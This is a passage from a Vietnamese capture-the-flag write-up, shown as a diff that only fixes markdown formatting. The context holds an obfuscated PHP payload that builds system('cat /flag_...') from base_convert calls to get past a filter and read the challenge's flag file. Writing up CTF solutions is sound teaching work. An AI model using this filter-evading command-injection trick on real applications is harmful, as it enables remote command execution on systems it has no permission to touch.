@@ -106,7 +106,7 @@ Giờ thì mình mở ra xem hoyyyyy
 Ở chuỗi chữ và số dài loằng ngoằng kia ban đầu mình chỉ dùng 1 lần **base_convert** nhưng mà nó bị tràn số ra kết quả hong chính xác nên mình chia thành 4 đoạn.
 Giờ chỉ cần ghép lại tất cả để có payload chính xác:
 
->**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)) **
+>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36))**
 
 Hơi dài nhưng chỉ 405chars vẫn thỏa < 1024 của đề bài. Cuối cùng nhận được kết quả:
 
